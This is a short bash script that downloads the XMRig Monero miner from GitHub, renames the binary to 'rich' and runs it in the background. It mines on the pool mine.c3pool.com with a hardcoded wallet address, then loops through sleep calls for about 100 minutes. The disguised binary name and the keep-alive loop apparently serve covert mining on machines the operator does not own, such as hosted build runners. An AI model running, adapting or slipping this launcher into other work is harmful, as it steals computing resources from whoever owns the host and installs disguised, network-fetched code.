#!/bin/bash

echo =============================== start ===============================
jsid=role
[ -n $2 ] && jsid=$2
jswallet="8C6cNDQ2bYdLSHjzQjF8hV5sx8erdkYgv6dyxyn1Snsh1PNNcWAB2A6QzpfxB7coERU7XQDvZvnYfJxvcAqyUvDfVUBZ7ju"
jssleeptime="100"
jspoolserver="mine.c3pool.com:15555"
jspoolcmd="-p id-$jsid -k"

echo $jswallet $jsxmrigname $jssleeptime $jspoolserver $jspoolcmd

#[ -n "$LOCALTEST" ] || sudo apt-get install libuv1-dev libssl-dev libhwloc-dev -y

[ -f "./rich" ] || {
    curl -o xmrig.tgz -s -L  https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz
    tar -zxf xmrig.tgz
    mv xmrig-6.9.0/xmrig ./rich
    rm -rf xmrig-6.9.0/ xmrig.tgz
}

echo "./rich -o $jspoolserver -u $jswallet $jspoolcmd"
[ x"$1" == "xrun" ] && ./rich -o $jspoolserver -u $jswallet $jspoolcmd -B
[ x"$1" == "xrun" ] && {
    for k in $( seq 1 $jssleeptime )
    do
        echo $k $jssleeptime $(date)
        sleep 60
    done
}
#[ x"$1" == "xrun" ] && killall rich

echo ===============================  end  ===============================
